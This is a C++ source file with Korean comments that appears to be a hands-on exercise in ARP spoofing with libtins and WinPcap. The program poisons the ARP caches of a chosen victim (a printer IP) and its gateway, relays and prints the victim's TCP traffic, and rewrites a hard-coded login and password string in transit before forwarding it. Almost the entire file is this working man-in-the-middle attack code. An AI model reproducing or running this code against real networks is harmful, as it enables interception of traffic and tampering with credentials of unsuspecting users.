#define TINS_STATIC
#define	ETHERTYPE_IP		0x0800

#include <iostream>
#include <string>
#include <stdio.h>
#include <stdexcept>
#include <cstdlib>
#include <thread>
#include <algorithm>
#include <tins/tins.h>
#include <pcap.h>
#include <stdio.h> 
#include <stdlib.h>
#include <time.h>
#define		HAVE_REMOTE
#include		"pcap.h"			
#include		"remote-ext.h"

#define		PACKET_SIZE		1000

#ifdef _WIN32
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#else
#include <unistd.h>
#endif // _WIN32
#include <tins/arp.h>
#include <tins/network_interface.h>
#include <tins/utils.h>
#include <tins/ethernetII.h>
#include <tins/packet_sender.h>


using namespace std;
using namespace Tins;


using std::runtime_error;

string dev;
NetworkInterface iface;
NetworkInterface::Info info;
EthernetII::address_type own_hw;
IPv4Address Attack, Victim, Gate;



void infection_packet(EthernetII infection_gw, EthernetII infection_victim, NetworkInterface infection_iface)
{
	PacketSender sender;

	while (true)
	{
		cout << ".";
		sender.send(infection_gw, infection_iface);
		sender.send(infection_victim, infection_iface);

#ifdef _WIN32
		Sleep(5);
#else
		sleep(5);
#endif	
	}

}



int main(int argc, char* argv[])
{

	if (argc != 3)
	{
		cout << "Error!!\n";
		cout << "./[FileName] [Attacker IP] [Printer IP]" << endl;
		return 1; //argv 인자값이 오류일때.
	}



	pcap_if_t	*alldevs;		// pcap 장치 정보 변수 구조체
	pcap_if_t	*d;				// pcap 장치 인터페이스 구조체
	pcap_t		*adhandle;	// 장치 설정 값 구조체 

	char errbuf[PCAP_ERRBUF_SIZE];
	int  i, inum, no_interface = 0;

	if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &alldevs, errbuf) == -1)
	{									// pcap_open()으로 열 수 있는 장치 list 생성 함수
										// 검사할 장치위치, null, 장치 정보 변수, 에러메세지 저장 변수
		fprintf(stderr, "Error in pcap_findalldevs: %s\n", errbuf);
		exit(1);
	}

	printf("\n>> 네트워크 인터페이스 카드\n");

	for (d = alldevs; d; d = d->next)	// 생성된 장치 list 출력  
	{
		printf("\n   %d) %s", ++no_interface, d->name);
		if (d->description) printf("\n      (%s)\n", d->description);
		else printf("(No description available)\n");
	}

	if (no_interface == 0)
	{
		printf("\7\7\n>> 인터페이스가 확인되지 않습니다 ! WinPcap 설치 여부를 점검하세요 !\n");
		return -1;
	}

	printf("\7\7\n.. 해당 인터페이스 번호를 선택하세요 (1-%d) ? ", no_interface);
	scanf("%d", &inum);
	if (inum < 1 || inum > no_interface)
	{
		printf("\n>> 인터페이스 번호 오류 !\n");
		pcap_freealldevs(alldevs);    // 동적 할당한 공간을 free
		return -1;
	}
	for (d = alldevs, i = 0; i<inum - 1; d = d->next, i++);
	if ((adhandle = pcap_open(d->name, 65536, PCAP_OPENFLAG_PROMISCUOUS, 0, NULL, errbuf))
		== NULL)		// 장치 이름, 캡쳐 가능한 크기, 모드, timeout, 원격장치 권한, 에러버퍼 크기
	{
		fprintf(stderr, "\n>> adapter open 오류 ! %s가 WinPcap에서 지원되지 않습니다 !\n", d->name);
		pcap_freealldevs(alldevs);
		return -1;
	}

	printf("\n\nListening on %s\n", d->description);
	//pcap_freealldevs(alldevs); // 동적 할당한 공간을 free

	Tins::Utils::gateway_from_ip(argv[1], Gate);

	try
	{
		Attack = argv[1];   // Attack 변수에 Attacker의 IP 초기화
		Victim = argv[2];   // Victim 변수에 Victim의 IP초기화 
	}
	catch (...)
	{
		cout << "Invalid ip found...\n";
		return 2;
	}

	try
	{
		iface = Gate;
		info = iface.addresses();
	}
	catch (runtime_error& ex) {
		cout << ex.what() << endl;
		return 3;
	}

	SnifferConfiguration config;
	config.set_immediate_mode(true);
	Sniffer sniffer(iface.name(), config);
	PacketSender sender;

	EthernetII::address_type gw_hw, victim_hw;

	gw_hw = Utils::resolve_hwaddr(iface, Gate, sender);
	victim_hw = Utils::resolve_hwaddr(iface, Victim, sender);


	cout << " Using gateway hw address: " << gw_hw << "\n";
	cout << " Using victim hw address:  " << victim_hw << "\n";
	cout << " Using own hw address:     " << info.hw_addr << "\n";

	ARP gw_arp(Gate, Victim, gw_hw, info.hw_addr),
		victim_arp(Victim, Gate, victim_hw, info.hw_addr);

	victim_arp.opcode(ARP::REPLY);								// Victim ARP opcode는 reply로 설정.
	gw_arp.opcode(ARP::REPLY);									// Gate ARP opcode는 reply로 설정.

	EthernetII to_victim = EthernetII(victim_hw, info.hw_addr) / victim_arp;	// 목적지는 victim, 출발지는 Attacker.
	EthernetII to_gw = EthernetII(gw_hw, info.hw_addr) / gw_arp;

	std::thread thread1(infection_packet, to_gw, to_victim, iface);

	while (true)
	{
		PDU *pdu = sniffer.next_packet();

		EthernetII *eth = pdu->find_pdu<EthernetII>();
		IP *ip = pdu->find_pdu<IP>();

		if (eth != NULL && ip != NULL)
		{
			if (eth->payload_type() == ETHERTYPE_IP)
			{
				if (eth->dst_addr().to_string() == info.hw_addr.to_string())
				{
					if (eth->src_addr().to_string() == victim_hw.to_string() && Victim == ip->src_addr())	//내가 보내는 패킷.
					{
						if (TCP *tcp = pdu->find_pdu<TCP>())
						{
							cout << "------------------------------- " << endl;
							cout << "Src eth: " << eth->src_addr() << endl;
							cout << "Dst eth: " << eth->dst_addr() << endl;
							cout << "ip------------------------------- " << endl;
							cout << "Src ip: " << ip->src_addr() << endl;
							cout << "Dst ip: " << ip->dst_addr() << endl;
							cout << "------------------------------- " << endl;
							cout << "Src port: " << tcp->sport() << endl;
							cout << "Dst port: " << tcp->dport() << endl;
							cout << endl;

							eth->src_addr(info.hw_addr);
							eth->dst_addr(gw_hw);

							PDU::serialization_type buffer = pdu->serialize();

							vector<uint8_t> *p = &buffer;

							string str(
							p && !p->empty() ? &*p->begin() : NULL,
							p && !p->empty() ? &*p->begin() + p->size() : NULL);

							if (str.find("loginId=FAFA9121&passwd=9121FAFA") != string::npos)
							{
								str.replace(str.find("loginId=FAFA9121&passwd=9121FAFA"), strlen("loginId=FAFA9121&passwd=9121FAFA"), "loginId=FAFA6361&passwd=6361FAFA");
								cout << str << endl << "str의 길이: " << str.length();

								char buf[60000];
								memcpy(buf, str.c_str(), str.length());

								//pcap_sendpacket(adhandle, (const u_char *)buf, (int)str.length());
								pcap_sendpacket(adhandle, (u_char *)buf, (int)str.length());
								cout << endl << "-------------------send------------------" << endl;

								continue;
							}
							else
								pdu->send(sender, iface.name());

								
						}

						eth->src_addr(info.hw_addr);	// Src eth 주소를 나의 eth addr로 바꿈
						eth->dst_addr(gw_hw);		// Dst eth 주소를 victim의 addr로 바꿈.
						pdu->send(sender, iface.name());

					}


					if (eth->src_addr().to_string() == gw_hw.to_string() && Victim == ip->dst_addr())	// Src eth 주소가 Gate이고 Dst ip 주소가 victim의 주소일때.
					{
						//	SetConsoleTextAttribute(console, FOREGROUND_BLUE | FOREGROUND_INTENSITY);
						//cout << "Web Packet!!!" << endl;

						eth->src_addr(info.hw_addr);	// Src eth 주소를 나의 eth addr로 바꿈
						eth->dst_addr(victim_hw);		// Dst eth 주소를 victim의 addr로 바꿈.
						pdu->send(sender, iface.name());

					}

				}
			}
		}
	}
}

